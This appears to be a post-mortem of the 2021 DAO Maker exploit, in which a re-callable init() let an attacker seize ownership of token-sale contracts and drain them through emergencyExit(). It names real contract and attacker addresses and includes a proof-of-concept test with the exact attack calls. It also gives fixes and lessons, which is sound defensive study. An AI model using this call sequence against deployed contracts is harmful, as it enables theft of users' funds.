# DAO Maker — init() Re-initialization + emergencyExit() Fund Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2021-09-04 |
| **Protocol** | DAO Maker |
| **Chain** | Ethereum |
| **Loss** | ~$7,000,000 (CAPS, CPD, DERC, SHO, etc.) |
| **Attacker** | [0x2708cace7b42302af26f1ab896111d87faeff92f](https://etherscan.io/address/0x2708cace7b42302af26f1ab896111d87faeff92f) |
| **Attack Tx** | [0x96bf6bd14a81](https://etherscan.io/tx/0x96bf6bd14a81cf19939c0b966389daed778c3a9528a6c5dd7a4d980dec966388) |
| **Vulnerable Contract** | DAOMaker [0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940](https://etherscan.io/address/0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940) |
| **Root Cause** | Unprotected `init()` function in SHO contracts allowed re-initialization to change ownership, followed by `emergencyExit()` to drain funds |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-09/DaoMaker_exp.sol) |

---
## 1. Vulnerability Overview

DAO Maker's SHO (Strong Holder Offering) contracts are initialized via an `init()` function, which remained callable even after the contract had already been initialized. The attacker re-invoked `init()` to become the new owner, then called `emergencyExit()` to withdraw all tokens held in the contract. Across 4 contracts, a total of 13.5M CAPS, 2.5M CPD (×2), 1.44M DERC, and 20.6M SHO were stolen.

---
## 2. Vulnerable Code Analysis

### 2.1 init() — No Re-initialization Guard

```solidity
// ❌ DAOMaker SHO Contract
// init() function has no initialization check
// Target contracts:
// 0x6e70c88be1d5c2a4c0c8205764d01abe6a3d2e22 (CAPS)
// 0xd6c8dd834abeeefa7a663c1265ce840ca457b1ec (CPD)
// 0xdd571023d95ff6ce5716bf112ccb752e86212167 (DERC)
// 0xa43b89d5e7951d410585360f6808133e8b919289 (SHO)

interface DAOMaker {
    // ❌ Unprotected init() — anyone can re-invoke
    function init(
        uint256 startTime,
        uint256[] calldata releasePeriods,
        uint256[] calldata releasePercents,
        address token
    ) external;

    // Owner-only — once ownership is hijacked via init(), immediately exploitable
    function emergencyExit(address to) external;
}
```

**Fixed Code**:
```solidity
// ✅ Using OpenZeppelin Initializable
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract DAOMakerSHO is Initializable, OwnableUpgradeable {
    function initialize(
        uint256 startTime,
        uint256[] calldata releasePeriods,
        uint256[] calldata releasePercents,
        address token
    ) external initializer {  // Executable only once
        __Ownable_init();
        _startTime = startTime;
        _token = IERC20(token);
        // ...
    }

    function emergencyExit(address to) external onlyOwner {
        uint256 balance = _token.balanceOf(address(this));
        _token.safeTransfer(to, balance);
        emit EmergencyExit(to, balance);
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**DaoMaker_decompiled.sol** — Related contract (vulnerable function Facet not included):
```solidity
// ❌ Root cause: Unprotected init() in SHO contracts allowed re-initialization to change ownership, followed by emergencyExit() to drain funds
// ⚠️ Source for vulnerable function `init()` is not in this file
// (Located in a Diamond pattern Facet or proxy implementation)
// SPDX-License-Identifier: UNLICENSED
// Source unverified — reverse-engineered from bytecode
// Original: 0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940 (Ethereum)
// Reverse engineering method: function selector extraction + 4byte.directory decoding

pragma solidity ^0.8.0;

contract DaoMaker_Decompiled {
}

```

## 3. Attack Flow

```
┌──────────────────────────────────────────────────────────────┐
│ Step 1: Re-invoke init() on DAOMaker SHO contracts           │
│ daomaker.init(                                               │
│   1640984401,                    // startTime               │
│   [5702400],                     // releasePeriods          │
│   [10000],                       // releasePercents (100%)  │
│   0x9fa69536d1cda4A04cFB50688294de75B505a9aE  // DERC token │
│ )                                                            │
│ → msg.sender (attacker) registered as new owner             │
└─────────────────────┬────────────────────────────────────────┘
                      │
┌─────────────────────▼────────────────────────────────────────┐
│ Step 2: Call daomaker.emergencyExit(address(this))           │
│ DAOMaker @ 0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940       │
│ → All DERC in contract transferred to attacker address       │
└─────────────────────┬────────────────────────────────────────┘
                      │ (repeated across 4 contracts)
┌─────────────────────▼────────────────────────────────────────┐
│ Step 3: 13.5M CAPS, 2.5M CPD×2, 1.44M DERC, 20.6M SHO drained│
└──────────────────────────────────────────────────────────────┘
```

---
## 4. PoC Code (DeFiHackLabs)

```solidity
// testExploit() — mainnet fork block 13,155,320
function testExploit() public {
    uint256[] memory releasePeriods = new uint256[](1);
    releasePeriods[0] = 5_702_400;
    uint256[] memory releasePercents = new uint256[](1);
    releasePercents[0] = 10_000; // 100%

    emit log_named_decimal_uint(
        "Before exploiting, Attacker DERC balance",
        DERC.balanceOf(address(this)), 18
    );

    // 1. Hijack ownership via init()
    // DAOMaker @ 0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940
    daomaker.init(
        1_640_984_401,
        releasePeriods,
        releasePercents,
        0x9fa69536d1cda4A04cFB50688294de75B505a9aE // DERC
    );

    // 2. Drain all tokens via emergencyExit()
    daomaker.emergencyExit(address(this));

    emit log_named_decimal_uint(
        "After exploiting, Attacker DERC balance",
        DERC.balanceOf(address(this)), 18
    );
}
```

---
## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | No re-initialization guard on init() — ownership takeover possible | CRITICAL | CWE-284 |
| V-02 | emergencyExit() immediately exploitable by new owner | CRITICAL | CWE-284 |

---
## 6. Remediation Recommendations

```solidity
// ✅ OpenZeppelin Initializable + initialize immediately upon deployment
// ✅ emergencyExit requires timelock + multisig

// Deployment pattern: atomic deploy+initialize via factory contract
contract SHOFactory {
    function createSHO(
        uint256 startTime,
        uint256[] calldata periods,
        uint256[] calldata percents,
        address token
    ) external returns (address) {
        SHOContract sho = new SHOContract();
        sho.initialize(startTime, periods, percents, token); // initialize immediately
        return address(sho);
    }
}
```

---
## 7. Lessons Learned

- **The init() pattern has been repeatedly exploited across multiple protocols including 88mph, DaoMaker, and Levyathan.** Implementing init() directly without OpenZeppelin Initializable is dangerous.
- **Admin-only escape functions like emergencyExit() become the ultimate target of ownership takeover attacks.** Such functions must never be made immediately executable without a timelock.
- **Four separate contracts shared the same vulnerability.** When fixing a common vulnerability, all instances of that pattern must be audited together.